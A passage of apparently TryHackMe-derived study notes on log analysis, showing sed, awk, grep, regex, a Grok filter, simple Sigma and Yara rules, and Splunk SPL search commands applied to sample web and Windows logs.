      1 202.176.73.99
      1 201.39.104.77
      1 200.89.134.22
      1 192.168.45.99
...
...
```

# sed

Both `sed` and `awk` are powerful 
text-processing tools commonly used for log analysis. They are sometimes
 used interchangeably, but both commands have their use cases and can 
allow security analysts to manipulate, extract, and transform log data 
efficiently.

Using the substitute syntax, `sed` can replace specific patterns or strings into log entries. For example, to replace all occurrences of "**31/Jul/2023**" with "**July 31, 2023**" in the `apache.log` file, we can use:

sed Example

```
user@tryhackme$ sed 's/31\/Jul\/2023/July 31, 2023/g' apache.log203.0.113.42 - - [July 31, 2023:12:34:56 +0000] "GET /index.php HTTP/1.1" 200 1234 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36"
120.54.86.23 - - [July 31, 2023:12:34:57 +0000] "GET /contact.php HTTP/1.1" 404 5678 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36"
...
...
```

Note that the backslash character `\` is required to "escape" the forward slash in our pattern and tell `sed` to treat the forward slash as a literal character. Also, note that the `sed` command *does not* change the `apache.log`
 file directly; instead, it only outputs the modified version of the 
file to the standard output in the command line. If you want to 
overwrite the file, you can add the `-i` option to edit the file in place or use a redirect operator `>` to save the output to the original or another file.

**Caution:** If you use the `-i` option with `sed`, you risk overwriting the original file and losing valuable data. Ensure to keep a backup copy!

# awk

For the `awk` command, a common use case, is conditional actions based on specific field values. For example, to print log entries where the HTTP response code is greater than or equal to `400` (which would indicate HTTP error statuses), we can use the following command:

awk Example

```
user@tryhackme$ awk '$9 >= 400' apache.log120.54.86.23 - - [31/Jul/2023:12:34:57 +0000] "GET /contact.php HTTP/1.1" 404 5678 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36"
156.98.34.12 - - [31/Jul/2023:12:35:02 +0000] "GET /about.php HTTP/1.1" 404 5678 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Safari/537.36"
189.76.230.44 - - [31/Jul/2023:12:35:06 +0000] "GET /about.php HTTP/1.1" 404 1234 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.170 Safari/537.36"
...
...
```

In this case, we're using the `$9` field (which in this log example refers to the HTTP status codes), requiring it to be greater than or equal to `400`.

This only scratches the surface of the power of these commands, and 
it is highly encouraged to read more about their options and use cases [here](https://www.theunixschool.com/p/awk-sed.html).

# grep

The `grep` command is a powerful text search tool widely 
used on UNIX systems and provides exceptional use cases in log analysis.
 It allows you to search for specific patterns or regular expressions 
within files or streams of text. Using `grep` can help 
analysts quickly identify relevant log entries that match specific 
criteria, particular resources or keywords, or patterns associated with 
security incidents.

The most basic usage of `grep` is to search for specific strings within log files. For example, if we are suspicious about any log entries that hit the `/admin.php` webpage on the server, we can `grep` for "admin" to return any relevant results:

grep Example

```
user@tryhackme$ grep "admin" apache.log145.76.33.201 - - [31/Jul/2023:12:34:54 +0000] "GET /admin.php HTTP/1.1" 200 4321 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.330 Safari/537.36"
```

Like the `uniq -c` command, we can append the `-c` option to `grep`
 to count the entries matching the search criteria. For example, because
 only a single line was returned in the above command, appending `-c` will return "1".

grep Example (with count)

```
user@tryhackme$ grep -c "admin" apache.log1
```

If we wanted to know which **line number** in the log file relates to the matched entries, we could add the `-n` option to help quickly locate specific occurrences:

grep Example (line number)

```
user@tryhackme$ grep -n "admin" apache.log                           37:145.76.33.201 - - [31/Jul/2023:12:34:54 +0000] "GET /admin.php HTTP/1.1" 200 4321 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.330 Safari/537.36"

```

In this case, the line number **"37"** is prepended to the log entry output.

Lastly, we can **invert** our command using the `-v` option only to select lines that **do not**
 contain the specified pattern or keyword(s). This can be useful for 
quickly filtering out unwanted or irrelevant lines from log files. For 
example, if we're not interested in any log entries that hit the `/index.php` page, we can run the following command to filter it out:

grep Example (inverted)

```
user@tryhackme$ grep -v "/index.php" apache.log | grep "203.64.78.90"203.64.78.90 - - [31/Jul/2023:12:35:01 +0000] "GET /about.php HTTP/1.1" 404 4321 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.170 Safari/537.36"
203.64.78.90 - - [31/Jul/2023:12:34:53 +0000] "GET /about.php HTTP/1.1" 200 1234 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.210 Safari/537.36"
203.64.78.90 - - [31/Jul/2023:12:34:46 +0000] "GET /contact.php HTTP/1.1" 200 4321 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.100 Safari/537.36"
203.64.78.90 - - [31/Jul/2023:12:34:32 +0000] "GET /login.php HTTP/1.1" 404 5678 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.330 Safari/537.36"
203.64.78.90 - - [31/Jul/2023:12:34:25 +0000] "GET /about.php HTTP/1.1" 404 4321 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36"
```

Notice that in the above command, we filtered out the `index.php` page and piped the output into another grep command that only pulled log entries that contained the IP address `203.64.78.90`.

Like with `awk` and `sed`, `grep` is
 an extremely powerful tool that cannot be fully covered in a single 
task. It is highly encouraged to read more about it on the official GNU 
manual page [here](https://www.gnu.org/software/grep/manual/grep.html).

While command-line log analysis offers powerful capabilities, 
it might only suit some scenarios, especially when dealing with vast and
 complex log datasets. A dedicated log analysis solution, like the 
Elastic (ELK)
 Stack or Splunk, can be more efficient and offer additional log 
analysis and visualization features. However, the command line remains 
essential for quick and straightforward log analysis tasks.

Log Analysis Tools: Regular Expressions

Regular expressions, abbreviated as *regex*,
 are an invaluable way to define patterns for searching, matching, and 
manipulating text data. Regular expression patterns are constructed 
using a combination of special characters that represent matching rules 
and are supported in many programming languages, text editors, and 
software.

This room won't cover the in-depth use of constructing regular expression patterns. However, the [Regular expressions](https://tryhackme.com/room/catregex) room is a fantastic resource for learning and practicing regex.

Regular expressions are widely used in log analysis to extract 
relevant information, filter data, identify patterns, and process logs 
before they are forwarded to a centralized SIEM system. It's even possible to use regex with the `grep` command, as it is an extremely powerful way to search for patterns in log files.

# Regular Expressions for grep

As a simple example, refer to the `apache-ex2.log` file within the ZIP file attached to this task. You can locate the task files on the AttackBox under `/root/Rooms/introloganalysis/task7`. Ensure to `unzip` the file first by running `unzip regex.zip` and then `cd regex`.

This log file contains log entries from a blog site. The site is 
structured so that each blog post has its unique ID, fetched from the 
database dynamically through the `post` URL parameter. If we are only interested in the specific blog posts with an ID between 10-19, we can run the following `grep` regular expression pattern on the log file:

grep Regex Example

```
user@tryhackme$ grep -E 'post=1[0-9]' apache-ex2.log203.0.113.1 - - [02/Aug/2023:10:15:23 +0000] "GET /blog.php?post=12 HTTP/1.1" 200 - "Mozilla/5.0"
100.22.189.54 - - [03/Aug/2023:12:48:43 +0000] "GET /blog.php?post=14 HTTP/1.1" 200 - "Mozilla/5.0"
34.210.98.12 - - [03/Aug/2023:15:30:56 +0000] "GET /blog.php?post=11 HTTP/1.1" 200 - "Mozilla/5.0"
102.210.76.44 - - [04/Aug/2023:19:26:29 +0000] "GET /blog.php?post=16 HTTP/1.1" 200 - "Mozilla/5.0"
98.88.76.103 - - [05/Aug/2023:17:56:33 +0000] "GET /blog.php?post=13 HTTP/1.1" 200 - "Mozilla/5.0"
76.88.44.90 - - [06/Aug/2023:12:58:22 +0000] "GET /blog.php?post=17 HTTP/1.1" 200 - "Mozilla/5.0"
98.76.102.33 - - [07/Aug/2023:15:24:30 +0000] "GET /blog.php?post=19 HTTP/1.1" 200 - "Mozilla/5.0"
...
...
```

Notice that we added the `-E` option to signify that we 
are searching on a pattern rather than just a string, which is what 
allows us to use regex. For the pattern itself, we match the literal 
characters `post=`. After which, we include the number `1` followed by the dynamic insertion of characters 0-9 using `[0-9]`. Putting this together, `1[0-9]` will match any two-digit number that starts with "1", such as 10, 11, 12, and onward.

# Regular Expressions for Log Parsing

Regular expressions also play a crucial role in log parsing, which is
 the process of breaking down log entries into structured components and
 extracting relevant information from them. Log files from different 
sources can have diverse formats and fields, sometimes requiring 
additional processing to transform raw log data into structured, 
actionable information.

Additionally, engineers can create custom regex patterns 
tailored to specific logs to map specific parts of a log entry to named 
fields for an SIEM system. Overall, this process makes it much easier to query and analyze the extracted data later.

Consider the following raw, unstructured log entry:

Log Entry Example

```
126.47.40.189 - - [28/Jul/2023:15:30:45 +0000] "GET /admin.php HTTP/1.1" 200 1275 "" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.9999.999 Safari/537.36"
```

From a security standpoint, several fields here would be beneficial to extract into an SIEM for visualization. Some of these include:

- The IP address
- The timestamp
- The HTTP method (POST, GET, or PUT, for example)
- The URL
- The user-agent

[RegExr](https://regexr.com/) is an online tool to help 
teach, build, and test regular expression patterns. To follow along, 
copy the above log entry and paste it into the "**Text**" section of the tool.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/740e3dbe4c3670c6d0deeb879709afd9.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/740e3dbe4c3670c6d0deeb879709afd9.png)

As a basic example, if we want to extract just the remote IP address 
from this log, we can think about the structure of the IP address 
logically. The IP address is the log entry's first part, consisting of 
four octets separated by periods. We can use the following pattern:

`\b([0-9]{1,3}\.){3}[0-9]{1,3}\b`

Paste this pattern into the "**Expression**" field in RegExr, and you will notice that the IP address from the log is successfully extracted and highlighted.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/bb98e758d1811b18fe940019aa07a6b5.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/bb98e758d1811b18fe940019aa07a6b5.png)

Breaking this pattern down, it begins and ends with a word boundary anchor `\b` to ensure we match complete IP addresses. In between, we define the following:

- `[0-9]{1,3}` - Matches one to three digits to match
numbers from 0 to 999. While IPv4 addresses octets cannot exceed 255,
this simplified pattern works for our use case.
- `\.` - Escapes and matches a literal `.` character in the IP address.
- `{3}` - Specifies that the previous capturing group `([0-9]{1,3}\.)` should be repeated three times.
- `[0-9]{1,3}` - Again, this matches numbers from 0 to 999, completing the fourth octet of the IP address.

# Example: and Grok

Grok is a powerful Logstash
 plugin that enables you to parse unstructured log data into something 
structured and searchable. It's commonly used for any log format written
 for humans to read rather than for computer consumption. It works by 
combining text patterns with the `%{SYNTAX:SEMANTIC}` pattern syntax. However, sometimes, Logstash lacks the built-in pattern we need. In these cases, we can define custom patterns using the **Oniguruma syntax**
 and take advantage of regular expressions. More info on Grok and its 
use within the Elastic Stack can be found in the Elastic documentation [here](https://www.elastic.co/guide/en/logstash/current/plugins-filters-grok.html).

We can use the pattern we previously created to successfully 
extract IPv4 addresses from our log file and process them into a custom 
field before they are sent to an SIEM. In an Elastic Stack scenario, we can add a filter using the `Grok` plugin within our Logstash configuration file to achieve this.

logstash.conf

```yaml
input {
  ...
}

filter {
  grok {
    match => { "message" => "(?<ipv4_address>\b([0-9]{1,3}\.){3}[0-9]{1,3}\b)" }
  }
}

output {
  ...
}
```

In the configuration above, we use our previously defined regular 
expression pattern to extract IPv4 addresses from the "message" field of
 incoming log events. The extracted values will be added under the 
custom "ipv4_addresses" field name we defined. Typically, IP addresses 
are extracted automatically by default configurations. But this simple 
example shows the power of regular expression patterns when dealing with
 complex log files and custom field requirements.

The [Logstash room](https://tryhackme.com/jr/logstash) and [the official Grok documentation](https://www.elastic.co/guide/en/logstash/current/plugins-filters-grok.html) are fantastic resources for further exploring Logstash input and filter configurations!

Log Analysis Tools: Yara and Sigma

# Sigma

[Sigma](https://github.com/SigmaHQ/sigma) 
is a highly flexible open-source tool that describes log events in a 
structured format. Sigma can be used to find entries in log files using 
pattern matching. Sigma is used to:

1. Detect events in log files
2. Create SIEM searches
3. Identify threats

Sigma uses the YAML
 syntax for its rules. This task will demonstrate Sigma being used to 
detect failed login events in SSH. Please note that writing a Sigma rule
 is out-of-scope for this room. However, let's break down an example 
Sigma rule for the scenario listed above:

```yaml
title: FailedSSH Logins
description: Searches sshd logs for failed SSH login attempts
status: experimental
author: CMNatic
logsource:
    product: linux
    service: sshd

detection:
    selection:
        type: 'sshd'
        a0|contains: 'Failed'
        a1|contains: 'Illegal'
    condition: selection
falsepositives:
    - Users forgetting or mistyping their credentials
level: medium
```

In this Sigma rule:

| **Key** | **Value** | **Description** |
| --- | --- | --- |
| title | Failed SSH Logins | This title outlines the purpose of the Sigma rule. |
| description | Searches sshd logs for failed SSH login attempts | This key provides a description that expands on the title. |
| status | experimental | This key explains the status of the rule. For example, "experimental" means that further testing or improvements must be done. |
| author | CMNatic | The person who wrote the rule. |
| logsource | product: linux service: sshd | Where can the log files that contain the data that we're looking for be found? |
| detection | sshd | This key lists what the Sigma rule is looking to find. |
| a0|contains | a0|contains: 'Failed' | In this case, look for all entries with "Failed". |
| a1|contains | a1|contains: 'Illegal' | In this case, look for all entries with "Illegal". |
| falsepositives | Users forgetting or mistyping their credentials | List cases where this entry may be present but doesn't necessarily indicate malicious behavior. |

This rule can now be used in SIEM platforms to identify events in the processed logs. If you want to learn more about Sigma, I recommend checking out the [Sigma](https://tryhackme.com/room/sigma) room on TryHackMe.

# Yara

[Yara](https://github.com/VirusTotal/yara)
 is another pattern-matching tool that holds its place in an analyst's 
arsenal. Yara is a YAML-formatted tool that identifies information based
 on binary and textual patterns (such as hexadecimal and strings). While
 it is usually used in malware analysis, Yara is extremely effective in 
log analysis.

Let's look at this example Yara rule called "IPFinder". This YARA 
rule uses regex to search for any IPV4 addresses. If the log file we are
 analyzing contains an IP address, YARA will flag it:

```yaml
rule IPFinder {
    meta:
        author = "CMNatic"
    strings:
        $ip = /([0-9]{1,3}\.){3}[0-9]{1,3}/ wide ascii

    condition:
        $ip
}
```

Let's look at the keys that make up this Yara rule:

| **Key** | **Example** | **Description** |
| --- | --- | --- |
| rule | IPFinder | This key names the rule. |
| meta | author | This key contains metadata. For example, in this case, it is the name of the rule's author. |
| strings | $ip = /([0-9]{1,3}\.){3}[0-9]{1,3}/ wide ascii | This key contains the values that YARA should look for. In this case, it is using REGEX to look for IPV4 addresses. |
| condition | $ip | If the variable $ip is detected, then the rule should trigger. |

Using YARA to detect a specific IP address

```
cmnatic@thm:~$ yara ipfinder.yar apache2.txtIPFinder apache2
```

This YARA rule can be expanded to look for:

- Multiple IP addresses
- IP Addresses based on a range (for example, an ASN or a subnet)
- IP addresses in HEX
- If an IP address lists more than a certain amount (I.e., alert if an IP address is found five times)
- And combined with other rules. For example, if an IP address visits a specific page or does a certain action

If you want to learn more about Yara, check out the [Yara](https://tryhackme.com/room/yara) room on TryHackMe.

## ADVANCED SPLUNK

**Search & Reporting App Overview**

**Search & Reporting App**
 is the default interface used to search and analyze the data on the 
Splunk Home page. It has various functionalities that assist analysts in
 improving the search experience.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/68395fd11ab6b3a4ebb5d4a4a77c8b36.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/68395fd11ab6b3a4ebb5d4a4a77c8b36.png)

Some important functionalities present in the search App are explained below:

**1) Search Head:**Search Head is where we use search processing language queries to look for the data.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/b162472e5f02c1a9ec6b92ee052ff415.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/b162472e5f02c1a9ec6b92ee052ff415.png)

**2) Time Duration:**This tab option provides multiple options to select the time duration for the search. **All-time** will display the events in real-time. Similarly, the **last 60 minutes** will display all the events captured in the last hour.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/d759303fcea6ffaf5b48bea06abb383f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/d759303fcea6ffaf5b48bea06abb383f.png)

**3) Search History:**This
 tab saves the search queries that the user has run in the past along 
with the time when it was run. It lets the user click on the past 
searches and look at the result. The filter option is used to search for
 the particular query based on the term.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/3b9087b12c5dd849dae2e61cdd7ba93a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/3b9087b12c5dd849dae2e61cdd7ba93a.png)

**4) Data Summary:**This
 tab provides a summary of the data type, the data source, and the hosts
 that generated the events as shown below. This tab is very important 
feature used to get a brief idea about the network visibility.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/81459123900e070704fe4fdac9f9b33e.gif](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/81459123900e070704fe4fdac9f9b33e.gif)

**5) Field Sidebar:**

The Field Sidebar can be found on the left panel of Splunk search. This 
sidebar has two sections showing selected fields and interesting fields.
 It also provides quick results, such as top values and raw values 
against each field.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/78cb1326f4351a7127062f2bc96273dc.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/78cb1326f4351a7127062f2bc96273dc.png)

Some important points to understand about the sidebar are explained below:

| **1- Selected Fields** | Splunk
 extracts the default fields like source, sourcetype, and host, which 
appear in each event, and places them under the selected fields column. 
We can select other fields that seem essential and add them to the list. |
| --- | --- |
| **2- Interesting Fields** | Pulls all the interesting fields it finds and displays them in the left panel to further explore. |
| **3- Alpha-numeric fields 'α'** | This alpha symbol shows that the field contains text values. |
| **4- Numeric fields '#'** | This symbol shows that this field contains numerical values. |
| **5- Count** | The number against each field shows the number of events captured in that timeframe. |

**Splunk Processing Language Overview**

Splunk
 Search Processing Language comprises of multiple functions, operators 
and commands that are used together to form a simple to complex search 
and get the desired results from the ingested logs. Main components of 
SPL are explained below:

**Search Field Operators**

Splunk
 field operators are the building blocks used to construct any search 
query. These field operators are used to filter, remove, and narrow down
 the search result based on the given criteria. Common field operators 
are Comparison operators, wildcards, and boolean operators.

# Comparison Operators

**These operators are used to compare the values against the fields. Some common comparisons operators are mentioned below:**

| **Field Name** | **Operator** | **Example** | **Explanation** |
| --- | --- | --- | --- |
| **Equal** | = | UserName=Mark | This
 operator is used to match values against the field. In this example, it
 will look for all the events, where the value of the field UserName is 
equal to Mark. |
| **Not Equal to** | != | UserName!=Mark | This operator returns all the events where the UserName value does not match Mark. |
| **Less than** | < | Age < 10 | Showing all the events with the value of Age less than 10. |
| **Less than or Equal to** | <= | Age <= 10 | Showing all the events with the value of Age less than or equal to 10. |
| **Greater than** | > | Outbound_traffic > 50 MB | This will return all the events where the Outbound traffic value is over 50 MB. |
| **Greater Than or Equal to** | >= | Outbound_traffic >= 50 MB | This will return all the events where the Outbound traffic value is greater or equal to 50 MB. |

Lets
 use the comparison operator to display all the event logs from the 
index "windowslogs", where AccountName is not Equal to "System"

**Search Query:** `index=windowslogs AccountName !=SYSTEM`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/681a126a98263612b87def7014583ffb.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/681a126a98263612b87def7014583ffb.png)

# 

# Boolean Operators

Splunk supports the following Boolean operators, which can be very handy in searching/filtering and narrowing down results.

| **Operator** | **Syntax** | **Explanation** |
| --- | --- | --- |
| **NOT** | field_A **NOT** value | Ignore the events from the result where field_A contain the specified value. |
| **OR** | field_A=value1 **OR** field_A=value2 | Return all the events in which field_A contains either value1 or value2. |
| **AND** | field_A=value1 **AND** field_B=value2 | Return all the events in which field_A contains value1 and field_B contains value2. |

To understand how boolean operator works in SPL, lets add the condition to show the events from the James account.

**Search Query:** `index=windowslogs AccountName !=SYSTEM **AND** AccountName=James`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/42c8963dccbd05128f52665c38877f47.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/42c8963dccbd05128f52665c38877f47.png)

# Wild Card

Splunk supports wildcards to match the characters in the strings.

| **Wildcard symbol** | **Example** | **Explanation** |
| --- | --- | --- |
| ***** | status=fail* | It will return all the results with values like 
status=failed
status=failure |

In the events, there are multiple DestinationIPs reported. Let's use the wildcard only to show the

**DestinationIP**

starting from 172.*

**Search Query:** `index=windowslogs DestinationIp=172.*`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/5530cae0739755e6a682641f5057b1a5.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/5530cae0739755e6a682641f5057b1a5.png)

**Filtering the Results in SPL**

Our network generates 
thousands of logs each minute, all ingesting into our SIEM solution. It 
becomes a daunting task to search for any anomaly without using filters.
 SPL allows us to use **Filters** to narrow down the result and only 
show the important events that we are interested in. We can add or 
remove certain data from the result using filters. The following 
commands are useful in applying filters to the search results.

**Fields**

| **Command** | **fields** |
| --- | --- |
| **Explanation** | Fields
 command is used to add or remove mentioned fields from the search 
results. To remove the field, minus sign ( - ) is used before the 
fieldname and plus ( + ) is used before the fields which we want to 
display. |
| **Syntax** | | fields <field_name1>  <field_name2> |
| **Example** | | `fields + HostName - EventID` |

Let's use the fields command to only display host, User, and SourceIP fields using the following syntax.

**Search Query:** `index=windowslogs | fields + host + User + SourceIp`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/dd77983b5fccf5eacfa73aacbeb7a314.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/dd77983b5fccf5eacfa73aacbeb7a314.png)

**Note:** Click on the **More field** to display the fields if some fields are not visible.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/30b2c651a041bd1c2db77b661dc8cc8e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/30b2c651a041bd1c2db77b661dc8cc8e.png)

**Search**

| **Command** | **search** |
| --- | --- |
| **Explanation** | This command is used to search for the raw text while using the chaining command `|` |
| **Syntax** | | search  <search_keyword> |
| **Example** | | `search "Powershell"` |

Use the search command to show all the events containing the term 
Powershell. This will return all the events that contain the term "**Powershell**".

**Search Query:** `index=windowslogs | search Powershell`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/02d2ece97e7f977e32b4c11fd86e41eb.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/02d2ece97e7f977e32b4c11fd86e41eb.png)

**Dedup**

| **Command** | **dedup** |
| --- | --- |
| **Explanation** | Dedup
 is  the command used to remove duplicate fields from the search 
results. We often get the results with various fields getting the 
same results. These commands remove the duplicates to show the unique 
values. |
| **Syntax** | | dedup <fieldname> |
| **Example** | | `dedup EventID` |

We can use the dedup command to show the list of unique **EventIDs** from a particular hostname.

**Search Query:** `index=windowslogs | table EventID User Image Hostname | dedup EventID`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/47bb3fb904c84acdbe7cb89dda535ac1.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/47bb3fb904c84acdbe7cb89dda535ac1.png)

**Rename**

| **Command** | **rename** |
| --- | --- |
| **Explanation** | It
 allows us to change the name of the field in the search results. It is 
useful in a scenario when the field name is generic or log, or it needs 
to be updated in the output. |
| **Syntax** | | rename  <fieldname> |
| **Example** | | `rename User as Employees` |

Let's rename the User field to Employees using the following search query.

**Search Query**: `index=windowslogs | fields + host + User + SourceIp | rename User as Employees`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/61e56df15649aa12b4be7c91d8cc91ce.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/61e56df15649aa12b4be7c91d8cc91ce.png)

**SPL - Structuring the Search Results**

SPL provides various commands to bring structure or order to the search 
results. These sorting commands like `head`, `tail`, and `sort` can be very useful during logs investigation. These ordering commands are explained below:

**Table**

| **Explanation** | Each
 event has multiple fields, and not every field is important to display.
 The Table command allows us to create a table with selective fields as 
columns. |
| --- | --- |
| **Syntax** | | table <field_name1> <fieldname_2> |
| **Example** | | `table`

| `head 20` # will return the top 20 events from the result list. |

This search query will create a table with three columns selected and ignore all the remaining columns from the display.

**Search Query:** `index=windowslogs | table EventID Hostname SourceName`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/643f5cc127276645eb0fd7fdb339cb29.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/643f5cc127276645eb0fd7fdb339cb29.png)

# Head

| **Explanation** | The **head** command returns the first 10 events if no number is specified. |
| --- | --- |
| **Syntax** | | head <number> |
| **Example** | | `head`   # will return the top 10 events from the result list
| `head 20`    # will return the top 20 events from the result list |

The following search query will show the table containing the mentioned fields and display only the top 5 entries.

**Search Query:** `index=windowslogs |  table _time EventID Hostname SourceName | **head 5**`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/3a9df7382d1f5e2e3302750dc5016809.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/3a9df7382d1f5e2e3302750dc5016809.png)

# Tail

| **Explanation** | The **Tail** command returns the last 10 events if no number is specified. |
| --- | --- |
| **Syntax** | | tail <number> |
| **Example** | | `tail` # will return the last 10 events from the result list| `tail 20`   # will return the last 20 events from the result list |

The following search query will show the table containing the mentioned fields and 
display only 5 entries from the bottom of the list.

**Search Query:** `index=windowslogs |  table _time EventID Hostname SourceName | tail 5`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/917811648cc95bd3f34c820a473b9c1b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/917811648cc95bd3f34c820a473b9c1b.png)

**sort**

| **Explanation** | The **Sort** command allows us to order the fields in ascending or descending order. |
| --- | --- |
| **Syntax** | | `sort` <field_name> |
| **Example** | | `sort Hostname` # This will sort the result in Ascending order. |

The following search query will ****sort the results based on the Hostname field.

**Search Query:** `index=windowslogs |  table _time EventID Hostname SourceName | sort Hostname`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/9589d101b5a07f69fc4771a6c1e54e14.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/9589d101b5a07f69fc4771a6c1e54e14.png)

# Reverse

| **Explanation** | The reverse command simply reverses the order of the events. |
| --- | --- |
| **Syntax** | |  reverse |
| **Example** | `<Search Query> | reverse` |

**Search Query:** `index=windowslogs | table _time EventID Hostname SourceName | reverse`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/0de4064ec74ee5f64a399e0a7bed9200.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/0de4064ec74ee5f64a399e0a7bed9200.png)

**Transformational Commands in SPL**

Transformational 
commands are those commands that change the result into a data 
structure from the field-value pairs. These commands simply transform 
specific values for each event into numerical values which can easily be
 utilized for statistical purposes or turn the results into 
visualizations. Searches that use these transforming commands are called
 transforming searches. Some of the most used transforming commands are 
explained below.

**General Transformational Commands**

**Top**

| **Command** | **top** |
| --- | --- |
| **Explanation** | This command returns frequent values for the top 10 events. |
| **Syntax** | | top  <field_name>
| top limit=6 <field_name> |
| **Example** | `top limit=3 EventID` |

The following command will display the top 7 Image ( representing Processes) captured.

**Search Query:** `index=windowslogs | top limit=7 Image`

**Rare**

| **Command** | **rare** |
| --- | --- |
| **Explanation** | This command does the opposite of top command as it returns the least frequent values or bottom 10 results. |
| **Syntax** | | rare <field_name>
| rare limit=6 <field_name> |
| **Example** | `rare limit=3 EventID` |

The following command will display the rare 7 Image (Processes) captured.

**Search Query:**

```
index=windowslogs | rare limit=7 Image
```

**Highlight**

| **Command** | **highlight** |
| --- | --- |
| **Explanation** | The highlight command shows the results in raw events mode with fields highlighted. |
| **Syntax** | highlight      <field_name1>      <field_name2> |
| **Example** | `highlight User, host, EventID, Image` |

The following command will highlight the three mentioned fields in the raw logs

**Search Query:**

```
index=windowslogs | highlight User, host, EventID, Image
```

# STATS Commands

SPL supports various stats commands that help in calculating statistics on the values. Some common stat commands are:

| **Command** | **Explanation** | **Syntax** | **Example** |
| --- | --- | --- | --- |
| **Average** | This command is used to calculate the average of the given field. | stats avg(field_name) | stats avg(product_price) |
